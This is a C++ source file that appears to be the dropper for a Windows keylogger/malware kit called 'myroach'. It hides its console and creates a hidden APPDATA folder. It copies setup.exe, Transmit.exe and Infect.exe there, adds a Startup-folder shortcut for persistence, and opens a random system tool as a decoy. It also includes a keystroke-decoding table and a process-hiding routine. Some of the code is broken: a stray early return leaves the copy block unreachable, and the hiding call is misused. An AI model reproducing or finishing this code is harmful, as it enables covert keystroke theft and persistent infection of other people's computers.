#include <windows.h>
#include <tlhelp32.h>  // For CreateToolhelp32Snapshot, PROCESSENTRY32, etc.
#include <ntstatus.h>  // For NtSetInformationProcess
#include <winternl.h>  // For ProcessAccessToken
#include <fstream>
#include <iostream>
#include <map>
#include <string>
#include <ctime>

using namespace std;

map<int, string> keyMap = {
    {1, "[LC]"}, {2, "[RC]"}, {8, "[<B]"}, {9, "[TAB]"}, {13, "\n"},
    {16, "[SH]"}, {17, "[CTR]"}, {18, "[ALT]"}, {19, "[PAUSE]"}, {20, "[CAP]"},
    {27, "[ESC]"}, {32, " "}, {33, "[PgUp]"}, {34, "[PgDn]"}, {45, "[INS]"},
    {46, "[DEL]"}, {47, "/"}, {48, "0"}, {49, "1"}, {50, "2"}, {51, "3"},
    {52, "4"}, {53, "5"}, {54, "6"}, {55, "7"}, {56, "8"}, {57, "9"},
    {65, "a"}, {66, "b"}, {67, "c"}, {68, "d"}, {69, "e"}, {70, "f"},
    {71, "g"}, {72, "h"}, {73, "i"}, {74, "j"}, {75, "k"}, {76, "l"},
    {77, "m"}, {78, "n"}, {79, "o"}, {80, "p"}, {81, "q"}, {82, "r"},
    {83, "s"}, {84, "t"}, {85, "u"}, {86, "v"}, {87, "w"}, {88, "x"},
    {89, "y"}, {90, "z"}, {91, "[STRT]"}, {92, "\\"}, {93, "[MNU]"},
    {96, "0"}, {97, "1"}, {98, "2"}, {99, "3"}, {100, "4"}, {101, "5"},
    {102, "6"}, {103, "7"}, {104, "8"}, {105, "9"}, {106, "*"}, {107, "+"},
    {109, "-"}, {110, "."}, {111, "/"}, {112, "[f1]"}, {113, "[f2]"},
    {114, "[f3]"}, {115, "[f4]"}, {116, "[f5]"}, {117, "[f6]"}, {118, "[f7]"},
    {119, "[f8]"}, {120, "[f9]"}, {121, "[f10]"}, {122, "[f11]"}, {123, "[f12]"},
    {124, "|"}, {144, "[NUM]"}, {150, "-"}, {186, ";"}, {187, "="}, {188, ","},
    {189, "-"}, {190, "."}, {191, "/"}, {192, "`"}, {219, "["}, {220, "\\"},
    {221, "]"}, {222, "'"}
};

string decode(int i) {
    if (keyMap.find(i) != keyMap.end()) {
        return keyMap[i];
    }
    return "[U?]";
}

int main() {
    FreeConsole();  //window is not visible

    char* appdataFolder = getenv("APPDATA");

    char folderPath[100] = {""};
    strcat(folderPath, appdataFolder);
    strcat(folderPath, "\\");
    strcat(folderPath, "myroach");

    if (CreateDirectory(folderPath, NULL))    //if directory creation does not fail
    {
        SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);
        return 0; // :)

        ///////////////////////////
        char run[100] = {""};
        strcat(run, folderPath);
        strcat(run, "\\");
        strcat(run, "setup.exe");

        char run_from[100] = {""};
        strcat(run_from, "myroach");
        strcat(run_from, "\\");
        strcat(run_from, "setup.exe");

        CopyFile(run_from, run, 0);

        ///////////////////////////
        char net[100] = {""};
        strcat(net, folderPath);
        strcat(net, "\\");
        strcat(net, "Transmit.exe");

        char net_from[100] = {""};
        strcat(net_from, "myroach");
        strcat(net_from, "\\");
        strcat(net_from, "Transmit.exe");

        CopyFile(net_from, net, 0);

        //////////////////////////
        char infect[100] = {""};
        strcat(infect, folderPath);
        strcat(infect, "\\");
        strcat(infect, "Infect.exe");

        char infect_from[100] = {""};
        strcat(infect_from, "myroach");
        strcat(infect_from, "\\");
        strcat(infect_from, "Infect.exe");

        CopyFile(infect_from, infect, 0);

        //////////////////////////
        char runlnk[100] = {""};
        strcat(runlnk, folderPath);
        strcat(runlnk, "\\");
        strcat(runlnk, "setup.lnk");

        char runlnk_from[100] = {""};
        strcat(runlnk_from, "myroach");
        strcat(runlnk_from, "\\");
        strcat(runlnk_from, "setup.lnk");

        CopyFile(runlnk_from, runlnk, 0);

        ///////////////////////////
        char infectlnk[100] = {""};
        strcat(infectlnk, folderPath);
        strcat(infectlnk, "\\");
        strcat(infectlnk, "Infect.lnk");

        char infectlnk_from[100] = {""};
        strcat(infectlnk_from, "myroach");
        strcat(infectlnk_from, "\\");
        strcat(infectlnk_from, "Infect.lnk");

        CopyFile(infectlnk_from, infectlnk, 0);

        /////////////////////////////////////////////////////////
        char tasklnkauto[100] = {""};
        strcat(tasklnkauto, appdataFolder);
        strcat(tasklnkauto, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\cockroach.lnk");

        CopyFile(runlnk_from, tasklnkauto, 0);
        //SetFileAttributes(tasklnkauto, FILE_ATTRIBUTE_HIDDEN);
    }

    srand(time(0));
    int random = rand();

    if (random % 5 == 0) {
        system("start taskmgr /Performance");
    } else if (random % 3 == 0) {
        system("start diskmgmt");
    } else if (random % 2 == 0) {
        system("start perfmon /res");
    } else {
        system("start calc");
    }

    return 0;
}

void hideProcess() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnap, &pe)) {
        do {
            if (strcmp(pe.szExeFile, "setup.exe") == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    DWORD dwResult = 0;
                    if (NtSetInformationProcess(hProcess, ProcessAccessToken, &dwResult, sizeof(DWORD))) {
                        CloseHandle(hProcess);
                    }
                }
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
}